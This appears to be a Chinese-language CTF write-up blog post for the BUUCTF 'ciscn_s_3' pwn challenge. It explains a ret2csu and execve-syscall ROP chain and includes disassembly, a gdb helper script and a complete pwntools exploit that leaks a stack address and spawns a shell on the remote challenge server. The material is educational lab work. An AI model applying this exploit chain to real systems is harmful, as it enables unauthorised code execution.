+++
title = "wp——csu&srop"
date = "2026-04-14"
type = "post"
categories = ['BUU']
tags = ['第一页', 'ciscn_s_3']
draft = false
+++
结合笔记里写到的csu部分配合srop食用
```
__unwind {
push    rbp
mov     rbp, rsp
xor     rax, rax
mov     edx, 400h       ; count
lea     rsi, [rsp+buf]  ; buf
mov     rdi, rax        ; fd
syscall                 ; LINUX - sys_read
mov     rax, 1
mov     edx, 30h ; '0'  ; count
lea     rsi, [rsp+buf]  ; buf
mov     rdi, rax        ; fd
syscall                 ; LINUX - sys_write
retn
```
主函数的结尾只有一个retn没有leave，此处函数运行结束的时候rsp是停在==saved_registers==上的而不是平时的return_address。
```
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
```
结合ret2csu
![Pasted image 20260303180124.png](Pasted%20image%2020260303180124.png)
read可以写入我们所需要的部分
write可以输出需要的地址等
看汇编能找到![Pasted image 20260303180546.png](Pasted%20image%2020260303180546.png)
```
00000000004004E2         mov     rax, 3Bh ; 
```
核心的rop链构造：（1）借read传入我们需要的字符串，再利用pop6传入寄存器的参数，完成需要的操作。（2）popcall让值转到寄存器上（3）向rax传参（4）将前面存入栈的字符串存入rdi中（5）syscall完成操作
```python
b'/bin/sh\x00' + b'b' * 8 + p64(pop6) + p64(0) + p64(1) + p64(bin_sh_interger) +  p64(0) + p64(0) + p64(0) + p64(ropcall) + p64(mov_rax) + p64(pop_rdi) + p64(buf) + p64(syscall)
```
这里缺少的（1）存入的字符串在内存上的位置（2）栈溢出
首先进行栈溢出b'a' * 10 + p64(vuln)
再查找字符串在内存中的位置，网上的脚本是这么写的，但跑不起来，以后再补上动调的部分。
```python
from pwn import *  
r = process('./ciscn_s_3')  
  
vuln_addr = 0x4004ED  
  
payload = b'/bin/sh\x00' + b"A" * 8 + p64(vuln_addr)  
  
r.send(payload)  
  
break_addr = 0x400503  
  
gdb_script = f"""  
    b *{break_addr}  
    c    """  
gdb.attach(r, gdbscript=gdb_script)  
  
pause()  
  
r.interactive()
```
结论是：

	好了，现在我们有了输入位置0x7fff1c0a8c50
	还有rsi中存储的信息（后续我们可以通过write泄露此信息）：0x7fff1c0a8d68
	他们之间的差值为0x118，差值不受到ASLR的影响，因此我们可以直接在写入位置构造我们的“/bin/sh”，然后明确指定该字符串所在的地址

得到最后的exp
```python
from pwn import *  
  
p = remote("node5.buuoj.cn",28446)  
file='./ciscn_s_3'  
elf = ELF(file)  
return_func = 0x04004ED  
mov_rax = 0x4004E2  
syscall = 0x400501  
pop6 = 0x40059A  
ropcall = 0x400580  
pop_rdi = 0x04005a3  
ret = 0x04003a9  
payload = b'b' * 0x10 + p64(return_func)  
p.sendline(payload)  
  
buf = u64(p.recv()[32:40]) - 0x118  #之后再说
payload = b'/bin/sh\x00' + b'b' * 8 + p64(pop6) + p64(0) + p64(1) + p64(buf+0x58) +  p64(0) + p64(0) + p64(0) + p64(ropcall) + p64(mov_rax) + p64(pop_rdi) + p64(buf) + p64(syscall)  
#为什么是p64(buf+0x58)见链接
p.sendline(payload)  
p.interactive()
```
ROP链参数设置详解.pdf
